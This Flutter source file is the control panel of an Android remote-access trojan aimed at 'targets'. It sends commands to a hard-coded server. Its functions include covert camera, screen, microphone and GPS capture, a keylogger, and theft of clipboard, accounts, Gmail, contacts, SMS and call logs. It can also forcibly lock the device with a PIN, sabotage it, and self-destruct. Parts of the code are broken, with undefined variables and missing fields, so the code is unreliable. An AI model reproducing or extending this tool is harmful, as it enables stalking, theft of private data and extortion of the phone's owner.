import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:ui'; // Wajib untuk efek Blur
import 'package:url_launcher/url_launcher.dart';

class ControlCenterPage extends StatefulWidget {
  const ControlCenterPage({super.key});

  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

class _ControlCenterPageState extends State<ControlCenterPage> {
  bool _isSending = false;
  final List<String> _executionLogs = [];
  bool _isStreamingScreen = false;
  String _currentStreamFrame = "";

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _triggerAutoWakeup();
    });
  }

  void _triggerAutoWakeup() {
    final args = ModalRoute.of(context)!.settings.arguments as Map<String, dynamic>?;
    final device = args?['device'] as Map<String, dynamic>?;
    if (device != null && device['id'] != null) {
      _sendCommand("force_open", device['id'].toString(), isSilent: true);
    }
  }

  void _addLog(String message) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(0, "[${DateTime.now().toString().substring(11, 19)}] $message");
        if (_executionLogs.length > 100) _executionLogs.removeLast();
      });
    }
  }

  // --- MODUL TAMPILKAN FOTO HASIL JEPRETAN ---
  void _showCapturedPhoto(String base64Image) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: Colors.transparent,
        content: _glassContainer(
          opacity: 0.2,
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                padding: const EdgeInsets.all(15),
                child: const Text("TARGET CAPTURED", style: TextStyle(color: Colors.orange, fontWeight: FontWeight.bold, letterSpacing: 2)),
              ),
              ClipRRect(
                borderRadius: BorderRadius.circular(10),
                child: Image.memory(
                  base64Decode(base64Image.replaceAll(RegExp(r'\s+'), '')),
                  fit: BoxFit.contain,
                  errorBuilder: (context, error, stackTrace) => const Padding(
                    padding: EdgeInsets.all(20),
                    child: Text("Corrupted Image Data", style: TextStyle(color: Colors.red)),
                  ),
                ),
              ),
              const SizedBox(height: 15),
              TextButton(
                onPressed: () => Navigator.pop(context),
                child: const Text("CLOSE", style: TextStyle(color: Colors.white)),
              )
            ],
          ),
        ),
      ),
    );
  }

  Future<void> _sendCommand(String command, String targetId,
      {String? extra, String? lockType, bool isSilent = false}) async {
    final String operatorName = args?['operator'] ?? "NXOB_ADMIN";

    if (targetId == "unknown") {
      if (!isSilent) _addLog("Error: ID Target unknown");
      return;
    }

    if (!isSilent) {
      setState(() => _isSending = true);
      _addLog("Kirim: $command -> $targetId");
    }

    try {
      final response = await http.post(
        Uri.parse("http://vinzzzzzzceo.rxpedia.web.id:10329/api/send-command"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": targetId,
          "command": command,
          "extra": extra ?? "",
          "type": lockType ?? "NORMAL",
          "admin": operatorName,
        }),
      ).timeout(const Duration(seconds: 15));

      if (response.statusCode == 200) {
        if (!isSilent) _addLog("Berhasil: $command terkirim.");
        _startResponsePolling(command, targetId, isSilent: isSilent);
      }
    } catch (e) {
      if (!isSilent) _addLog("Error: Koneksi gagal.");
    } finally {
      if (!isSilent) setState(() => _isSending = false);
    }
  }

  void _startResponsePolling(String cmd, String targetId, {bool isSilent = false}) async {
    int attempts = 0;
    bool received = false;
    int maxAttempts = 15;
    while (attempts < maxAttempts && !received) {
      await Future.delayed(Duration(milliseconds: isSilent ? 800 : 2500));
      attempts++;
      try {
        final response = await http.get(
          Uri.parse("http://vinzzzzzzceo.rxpedia.web.id:10329/api/get-response/$targetId"),
        );
        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          if (data['data'] != null && data['cmd'] == cmd) {
            _processResponse(cmd, data['data'], targetId);
            received = true;
          }
        }
      } catch (e) {}
    }
  }

  void _processResponse(String cmd, dynamic data, String targetId) {
    if (data == null) return;
    if (cmd == "target_chat_reply") {
      _addLog("REPLY: ${data['message']}");
    } else if (cmd == "get_clipboard") {
      _addLog("CLIPBOARD: ${data['clipboard']}");
    } else if (cmd == "get_heat") {
      _addLog("HEAT: ${data['thermal']}");
    } else if (cmd == "get_accounts") {
      _addLog("ACCOUNTS: ${data['accounts']}");
    } else if (cmd == "get_system_stats") {
      _addLog("STATS: ${data['stats']}");
    } else if (cmd == "take_photo") {
      _addLog("IMAGE RECEIVED.");
      if (data is String) {
         _showCapturedPhoto(data);
      } else if (data is Map && data['image'] != null) {
         _showCapturedPhoto(data['image']);
      }
    } else {
      _addLog("Respon [$cmd] Diterima.");
    }
  }

  // --- REUSABLE GLASS CONTAINER ---
  Widget _glassContainer({required Widget child, double blur = 10, double opacity = 0.05}) {
    return ClipRRect(
      borderRadius: BorderRadius.circular(15),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: blur, sigmaY: blur),
        child: Container(
          decoration: BoxDecoration(
            color: Colors.white.withOpacity(opacity),
            borderRadius: BorderRadius.circular(15),
            border: Border.all(color: Colors.white.withOpacity(0.1), width: 1.5),
          ),
          child: child,
        ),
      ),
    );
  }

  void _showCameraMenu(String targetId) {
    String selectedCam = "back";
    showDialog(
        context: context,
        builder: (context) => StatefulBuilder(
            builder: (context, setInternalState) => AlertDialog(
                  backgroundColor: Colors.transparent,
                  content: _glassContainer(
                    child: Padding(
                      padding: const EdgeInsets.all(20),
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          const Text("Surveillance Camera", style: TextStyle(color: Colors.white, fontSize: 16)),
                          const SizedBox(height: 20),
                          Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: [
                            _cameraOption(Icons.camera_rear, "BACK", "back", selectedCam, (v) => setInternalState(() => selectedCam = v)),
                            _cameraOption(Icons.camera_front, "FRONT", "front", selectedCam, (v) => setInternalState(() => selectedCam = v)),
                          ]),
                          const SizedBox(height: 20),
                          ElevatedButton(
                              style: ElevatedButton.styleFrom(backgroundColor: Colors.orange),
                              onPressed: () {
                                _sendCommand("take_photo", targetId, extra: selectedCam);
                                Navigator.pop(context);
                              },
                              child: const Text("CAPTURE")),
                        ],
                      ),
                    ),
                  ),
                )));
  }

  Widget _cameraOption(IconData i, String l, String v, String curr, Function(String) onTap) {
    bool isS = v == curr;
    return GestureDetector(
        onTap: () => onTap(v),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Icon(i, size: 40, color: isS ? Colors.orange : Colors.white24),
          const SizedBox(height: 5),
          Text(l, style: TextStyle(color: isS ? Colors.orange : Colors.white24, fontSize: 10)),
        ]));
  }

  void _showInputDialog(String title, String cmd, String targetId) {
    TextEditingController t = TextEditingController();
    TextEditingController p = TextEditingController();
    String lockType = "NORMAL";
    showDialog(
        context: context,
        builder: (context) => StatefulBuilder(
            builder: (context, setS) => AlertDialog(
                  backgroundColor: Colors.transparent,
                  content: _glassContainer(
                    child: Padding(
                      padding: const EdgeInsets.all(20),
                      child: Column(mainAxisSize: MainAxisSize.min, children: [
                        Text(title, style: const TextStyle(color: Colors.white, fontSize: 16)),
                        const SizedBox(height: 15),
                        if (cmd == "hard_lock")
                          Row(children: [
                            ChoiceChip(label: const Text("PIN"), selected: lockType == "NORMAL", onSelected: (v) => setS(() => lockType = "NORMAL")),
                            const SizedBox(width: 10),
                            ChoiceChip(label: const Text("CHAT"), selected: lockType == "CHAT", onSelected: (v) => setS(() => lockType = "CHAT")),
                          ]),
                        TextField(
                            controller: t,
                            style: const TextStyle(color: Colors.white),
                            decoration: InputDecoration(
                                labelText: cmd == "set_bright" ? "Level (0.0 - 1.0)" : "Data/Pesan",
                                labelStyle: const TextStyle(color: Colors.white54))),
                        if (cmd == "hard_lock" && lockType == "NORMAL")
                          TextField(
                              controller: p,
                              keyboardType: TextInputType.number,
                              style: const TextStyle(color: Colors.white),
                              decoration: const InputDecoration(labelText: "PIN Unlock", labelStyle: TextStyle(color: Colors.white54))),
                        const SizedBox(height: 20),
                        ElevatedButton(
                            onPressed: () {
                              _sendCommand(cmd, targetId, extra: cmd == "hard_lock" ? "${t.text}|${p.text}" : t.text, lockType: lockType);
                              Navigator.pop(context);
                            },
                            child: const Text("SEND")),
                      ]),
                    ),
                  ),
                )));
  }

  Widget _buildControlBlock(String title, Color color, List<Widget> buttons) {
    return Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Padding(
          padding: const EdgeInsets.fromLTRB(15, 15, 0, 10),
          child: Text(title, style: TextStyle(color: color, fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 1.5))),
      Padding(padding: const EdgeInsets.symmetric(horizontal: 10), child: Wrap(spacing: 12, runSpacing: 12, children: buttons)),
    ]);
  }

  Widget _btn(String label, IconData icon, Color color, String cmd, String targetId,
      {bool isInput = false, bool isCam = false, bool isPage = false, Widget? destination}) {
    return InkWell(
      onTap: () {
        if (isPage && destination != null) {
          Navigator.push(context, MaterialPageRoute(builder: (context) => destination));
        } else if (isCam) {
          _showCameraMenu(targetId);
        } else if (isInput) {
          _showInputDialog(label, cmd, targetId);
        } else if (cmd == 'get_notif_logs') {
          _fetchNotificationLogs(targetId);
        } else {
          _sendCommand(cmd, targetId);
        }
      },
      child: _glassContainer(
        opacity: 0.1,
        child: Container(
          width: MediaQuery.of(context).size.width / 4 - 18,
          padding: const EdgeInsets.symmetric(vertical: 15),
          child: Column(children: [
            Icon(icon, color: color, size: 22),
            const SizedBox(height: 6),
            Text(label, style: const TextStyle(color: Colors.white, fontSize: 9, fontWeight: FontWeight.w500), textAlign: TextAlign.center, maxLines: 1),
          ]),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final String targetId = device?['id']?.toString() ?? "unknown";

    return DefaultTabController(
      length: 4,
      child: Scaffold(
        backgroundColor: Colors.black, // Background Hitam Pekat
        appBar: AppBar(
          backgroundColor: Colors.black,
          elevation: 0,
          title: Text(device?['model'] ?? "Terminal", style: const TextStyle(fontSize: 18, fontWeight: FontWeight.bold, color: Colors.white)),
          bottom: TabBar(
            isScrollable: true,
            indicatorColor: Colors.orange,
            indicatorWeight: 3,
            labelStyle: const TextStyle(fontWeight: FontWeight.bold),
            unselectedLabelColor: Colors.white38,
            tabs: const [Tab(text: "INTEL"), Tab(text: "SABOTAGE"), Tab(text: "SYSTEM"), Tab(text: "LOCKDOWN")],
          ),
          actions: [
            _isSending
                ? const Center(child: Padding(padding: EdgeInsets.all(15), child: SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.orange))))
                : IconButton(onPressed: () => _sendCommand("force_open", targetId, isSilent: true), icon: const Icon(Icons.refresh, color: Colors.white))
          ],
        ),
        body: Container(
          decoration: const BoxDecoration(
            gradient: RadialGradient(
              center: Alignment(0.7, -0.5),
              radius: 1.5,
              colors: [Color(0xFF1A1D2D), Colors.black],
            ),
          ),
          child: Column(
            children: [
              _buildLogContainer(),
              Expanded(
                child: TabBarView(
                  children: [
                    ListView(physics: const BouncingScrollPhysics(), children: [
                      _buildControlBlock("LIVE SURVEILLANCE", Colors.orangeAccent, [
                        _btn("Photo", Icons.camera, Colors.orangeAccent, "take_photo", targetId, isCam: true),
                        _btn("Screen", Icons.screenshot, Colors.orangeAccent, "get_screen", targetId),
                        _btn("Mic Start", Icons.mic, Colors.red, "mic_record_start", targetId),
                        _btn("Mic Stop", Icons.mic_off, Colors.white, "mic_record_stop", targetId),
                        _btn("GPS", Icons.location_on, Colors.greenAccent, "get_location", targetId),
                      ]),
                      _buildControlBlock("DATA MINING", Colors.blueAccent, [
                        _btn("Keylogger", Icons.keyboard, Colors.yellow, "check_keylogger", targetId),
                        _btn("Clipboard", Icons.content_paste, Colors.blueAccent, "get_clipboard", targetId),
                        _btn("Accounts", Icons.account_circle, Colors.teal, "get_accounts", targetId),
                        _btn("Contacts", Icons.person, Colors.blueAccent, "get_contacts", targetId,
                            isPage: true, destination: DataViewerPage(title: "Contacts", cmd: "get_contacts", targetId: targetId)),
                        _btn("Gmail", Icons.email, Colors.redAccent, "get_gmails", targetId),
                        _btn("Apps", Icons.apps, Colors.tealAccent, "get_apps", targetId,
                            isPage: true, destination: DataViewerPage(title: "Apps List", cmd: "get_apps", targetId: targetId)),
                        _btn("Heat Info", Icons.thermostat, Colors.redAccent, "get_heat", targetId),
                        _btn("Stats", Icons.bar_chart, Colors.grey, "get_system_stats", targetId),
                      ]),
                    ]),
                    ListView(physics: const BouncingScrollPhysics(), children: [
                      _buildControlBlock("INTERCEPTION", Colors.pinkAccent, [
                        _btn("Live MSG", Icons.message, Colors.pinkAccent, "get_notif_logs", targetId),
                        _btn("SMS Chat", Icons.sms, Colors.pinkAccent, "get_sms", targetId,
                            isPage: true, destination: SmsChatViewerPage(targetId: targetId)),
                        _btn("Call Logs", Icons.history, Colors.pinkAccent, "get_calls", targetId),
                        _btn("Acc. Perm", Icons.accessibility, Colors.orange, "force_accessibility", targetId),
                        _btn("Notif Acc", Icons.security, Colors.pinkAccent, "open_notif_access", targetId),
                      ]),
                      _buildControlBlock("HARDWARE SABOTAGE", Colors.cyanAccent, [
                        _btn("Strobe", Icons.flash_on, Colors.yellowAccent, "flash_strobe", targetId),
                        _btn("Stop Strb", Icons.flash_off, Colors.white, "stop_strobe", targetId),
                        _btn("Vol Max", Icons.volume_up, Colors.redAccent, "set_vol_max", targetId),
                        _btn("Vibrate", Icons.vibration, Colors.cyanAccent, "vibrate_loop", targetId),
                        _btn("DDoS Net", Icons.wifi_off, Colors.redAccent, "record_audio", targetId),
                        _btn("WA Bug", Icons.bug_report, Colors.greenAccent, "wa_bug", targetId),
                      ]),
                    ]),
                    ListView(physics: const BouncingScrollPhysics(), children: [
                      _buildControlBlock("UI MANIPULATION", Colors.purpleAccent, [
                        _btn("Wallpaper", Icons.image, Colors.blueAccent, "set_wallpaper", targetId, isInput: true),
                        _btn("Audio URL", Icons.music_note, Colors.yellowAccent, "play_audio", targetId, isInput: true),
                        _btn("Stop Aud", Icons.stop, Colors.white, "stop_audio", targetId),
                        _btn("Bright", Icons.brightness_6, Colors.white, "set_bright", targetId, isInput: true),
                        _btn("Speak TTS", Icons.record_voice_over, Colors.purpleAccent, "speak_tts", targetId, isInput: true),
                        _btn("Toast", Icons.chat_bubble_outline, Colors.white, "toast_spam", targetId, isInput: true),
                        _btn("Open URL", Icons.link, Colors.blue, "open_url", targetId, isInput: true),
                        _btn("Bring Front", Icons.open_in_new, Colors.white, "bring_to_foreground", targetId),
                      ]),
                    ]),
                    ListView(physics: const BouncingScrollPhysics(), children: [
                      _buildControlBlock("SECURITY LOCKDOWN", Colors.redAccent, [
                        _btn("LOCK HP", Icons.lock, Colors.redAccent, "hard_lock", targetId, isInput: true),
                        _btn("UNLOCK", Icons.lock_open, Colors.greenAccent, "unlock", targetId),
                        _btn("SELF DEST", Icons.delete_forever, Colors.red, "self_destruct", targetId),
                      ]),
                    ]),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildLogContainer() {
    return Padding(
      padding: const EdgeInsets.all(12),
      child: _glassContainer(
        opacity: 0.15,
        child: Container(
          height: 100,
          width: double.infinity,
          padding: const EdgeInsets.all(10),
          child: ListView.builder(
              itemCount: _executionLogs.length,
              itemBuilder: (context, i) => Text(_executionLogs[i], style: const TextStyle(color: Color(0xFF00FF41), fontSize: 11, fontFamily: 'monospace'))),
        ),
      ),
    );
  }

  void _fetchNotificationLogs(String targetId) async {
    _addLog("Fetching notifications...");
    _sendCommand("get_notif_logs", targetId, isSilent: true);
  }
}

// =========================================================================
// [VVIP MODULES DATA VIEWER]
// =========================================================================

class SmsChatViewerPage extends StatefulWidget {
  const SmsChatViewerPage({super.key, required this.targetId});
  @override
  State<SmsChatViewerPage> createState() => _SmsChatViewerPageState();
}

class _SmsChatViewerPageState extends State<SmsChatViewerPage> {
  List<dynamic> _messages = [];
  bool _isLoading = true;

  @override
  void initState() {
    super.initState();
    _fetchSmsData();
  }

  Future<void> _fetchSmsData() async {
    try {
      final res = await http.get(Uri.parse("http://vinzzzzzzceo.rxpedia.web.id:10329/api/get-response/${widget.targetId}"));
      if (res.statusCode == 200) {
        final json = jsonDecode(res.body);
        if (mounted) setState(() { _messages = json['data']['sms'] ?? []; _isLoading = false; });
      }
    } catch (e) { if (mounted) setState(() => _isLoading = false); }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(title: const Text("SMS Interceptor"), backgroundColor: Colors.black),
      body: _isLoading 
        ? const Center(child: CircularProgressIndicator(color: Colors.pinkAccent))
        : ListView.builder(
            padding: const EdgeInsets.all(15),
            itemCount: _messages.length,
            itemBuilder: (context, i) {
              final msg = _messages[i];
              return Container(
                margin: const EdgeInsets.only(bottom: 12),
                child: ClipRRect(
                  child: BackdropFilter(
                    filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
                    child: Container(
                      padding: const EdgeInsets.all(15),
                      decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(15), border: Border.all(color: Colors.pinkAccent.withOpacity(0.2))),
                      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                        Text(msg['address'] ?? "Unknown", style: const TextStyle(color: Colors.pinkAccent, fontWeight: FontWeight.bold)),
                        const SizedBox(height: 5),
                        Text(msg['body'] ?? "", style: const TextStyle(color: Colors.white)),
                      ]),
                    ),
                  ),
                ),
              );
            },
          ),
    );
  }
}

class DataViewerPage extends StatefulWidget {
  final String title;
  final String cmd;
  const DataViewerPage({super.key, required this.title, required this.cmd, required this.targetId});
  @override
  State<DataViewerPage> createState() => _DataViewerPageState();
}

class _DataViewerPageState extends State<DataViewerPage> {
  List<dynamic> _dataList = [];

  @override
  void initState() { super.initState(); _fetchData(); }

  Future<void> _fetchData() async {
    try {
      if (res.statusCode == 200) {
        if (mounted) setState(() { _dataList = json['data'][widget.cmd == "get_apps" ? "apps" : "contacts"] ?? []; _isLoading = false; });
      }
    } catch (e) { if (mounted) setState(() => _isLoading = false); }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(title: Text(widget.title), backgroundColor: Colors.black),
      body: _isLoading 
        ? const Center(child: CircularProgressIndicator())
        : ListView.builder(
            itemCount: _dataList.length,
            itemBuilder: (context, i) {
              final item = _dataList[i];
              return Container(
                margin: const EdgeInsets.symmetric(horizontal: 15, vertical: 5),
                decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(10)),
                child: ListTile(
                  leading: Icon(widget.cmd == "get_apps" ? Icons.android : Icons.person, color: Colors.orange),
                  title: Text(item['name'] ?? "Unknown", style: const TextStyle(color: Colors.white)),
                  subtitle: Text(widget.cmd == "get_apps" ? (item['package'] ?? "") : (item['num'] ?? ""), style: const TextStyle(color: Colors.white38)),
                ),
              );
            },
          ),
    );
  }
}